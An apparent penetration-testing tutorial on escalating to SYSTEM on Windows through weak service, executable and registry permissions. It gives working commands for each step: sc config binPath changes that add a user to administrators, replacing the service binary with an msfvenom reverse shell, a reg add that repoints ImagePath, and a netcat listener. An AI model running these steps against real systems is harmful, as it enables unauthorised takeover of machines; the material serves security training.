Windows services are sometimes configured with **weak permissions linked to the service itself**, or to **the directory the service is being run from.**

This can allow attackers to manipulate the service in order to execute arbitrary code when it starts and escalate privileges to SYSTEM.


1.Service BINPath Manupulation
--

The first way to exploit this vulnerability is to change the `BINPath` of the service to an arbitrary executable, so that when the service starts it will execute malicious code in order to grant SYSTEM level access to the machine.

**Identifying Vulnerable Services**

`AccessChk` is a command-line tool for viewing the effective permissions on `files`, `registry keys`, `services`, `processes`, `kernel objects`, and more. This tool will be helpful to identify whether the current user can modify files within a certain service directory.

First, we should transfer the ```accesschk.exe``` binary to the target machine using the different methodes (for example, the python server).

The command below will list all the services that the user `lol` can modify.


```
accesschk.exe -uwcqv "lol" * -accepteula
```
![Screenshot from 2024-09-30 01-12-32](https://github.com/user-attachments/assets/d5e8d9e4-6595-450b-9dcd-70ca119efb58)


`Service All Access` means that the user has full control over this service and therefore it is possible the **properties** of this service to be modified.

The next step is to determine the status of this service, the binary path name and if the service with higher privileges.
```
sc qc apache
```
![Screenshot from 2024-09-30 01-13-01](https://github.com/user-attachments/assets/b9f66d01-85c9-485a-aec2-4b327d263d58)
Since the Apache service is running as Local System this means that the `BINARY_PATH_NAME` parameter can be modified to execute any command on the system.

**Exploit**


We will change the service path in order to add the `lol` user to the local administrators group.

```
sc config "Apache" binPath= "net localgroup administrators lol /add" 
```
#or
We can change the path and set our generated ```shell.exe``` binary by ```msfvenom``` to `BINARY_PATH_NAME` and setup our listener:
```
sc config "Apache" binPath= "C:\Users\lol\Downloads\shell.exe
```
Restarting the service will cause our command to be excuted and add our user `lol` to the administrators group:
```
sc stop Apache
sc start Apache
```
We could verify this:
```
net localgroup administrators
```
2.Metasploit
---

There is metasploit module which can exploit weak service permissions very easily. This module needs to be linked into an existing session.
```
use exploit/windows/local/service_permissions
```

This module will try to identify services that the user has write access on the binary path and if this succeeds, will write a payload in a temporary folder, reconfigure the binary path of the service to point into the payload and not in the original executable and finally will attempt to restart the service in order for the payload to be executed as SYSTEM.



3.Replacing Service Executable
--

The second way to exploit this is to simply replace the executable used by the application with a reverse shell generated using MSFvenom. Write access to the executable is required in order to exploit this vulnerability.



The first thing to do is to verify whether the current user has **access to modify the executable file** used for our vuln service.
```
icacls "Path to service executable" 2>nul
```


**Exploit**



Replacing the service executable with the reverse shell created earlier:
```
copy \path\to\our\shell.exe "Path to vuln service executable"
```

Setting up a Netcat listener:
```
nc -nlvp 1234
```


4.Weak Registry Permissions
---

When a service is created in Windows, there is normally a correspondent registry entry which contains important information about the service. One of which, is the Image Path, which is the path to the binary used by the service.

If the current user **has access to modify this entry**, the service executable can be replaced with a reverse shell generated using MSFvenom.

The service registry keys are stored at the following location:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
```
The following command can be used in Powershell to query service registry keys permission:
```
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\<our vuln service> | fl
```



**Exploit**

Replacing the ```Image Path``` for the "Apache" service with the reverse shell created earlier using the following command:
```
reg add "HKLM\SYSTEM\CurrentControlSet\services\Apache" /v ImagePath /t REG_EXPAND_SZ /d C:\Users\lol\Downloads\shell.exe /f
```
Setting up a Netcat listener:

```
nc -nlvp 1234
```
stopping and starting the service grants a SYSTEM level shell:
```
sc stop Apache
sc start Apache
```




Automated scripts such as WinPEAS can also help identify Weak Permissions in services:
--
```
winpeas.exe quiet servicesinfo
```

















